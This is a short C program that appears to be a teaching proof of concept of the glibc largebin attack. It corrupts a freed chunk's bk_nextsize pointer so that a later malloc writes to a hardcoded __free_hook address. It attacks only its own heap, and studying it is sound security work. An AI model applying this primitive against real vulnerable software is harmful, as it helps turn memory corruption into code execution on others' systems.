#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <unistd.h>
#include <string.h>
#define __free_hook 0x7ffff7fb45a8

long long list[0x10] = {0};

void init() {
	setvbuf(stdout, 0, 2, 0);
	setvbuf(stdin, 0, 1, 0);
	setvbuf(stderr, 0, 1, 0);
}

int main(){
	long long *p1,*p2,*junk1,*junk2;
	init();
	p1 = malloc(0x478);
	junk1 = malloc(0x18); // junk1 to avoid merging
	p2 = malloc(0x498);
	junk2 = malloc(0x18); // junk2 to avoid merging to top chunk
	sleep(0);
	free(p1);
	malloc(0x600); // place p1 to large bin
	sleep(0);
	free(p2);
	*(p1 + 2) = 0; // set zero to avoid unlink
	// why unlink? while malloc 0x68, next step is unlink
	*(p1 + 3) = __free_hook - 0x20; // set p1's bk_next_size to target_addr - 0x20
	sleep(0);
	malloc(0x68); // trigger largebin attack
	sleep(0);
	return 0;
}
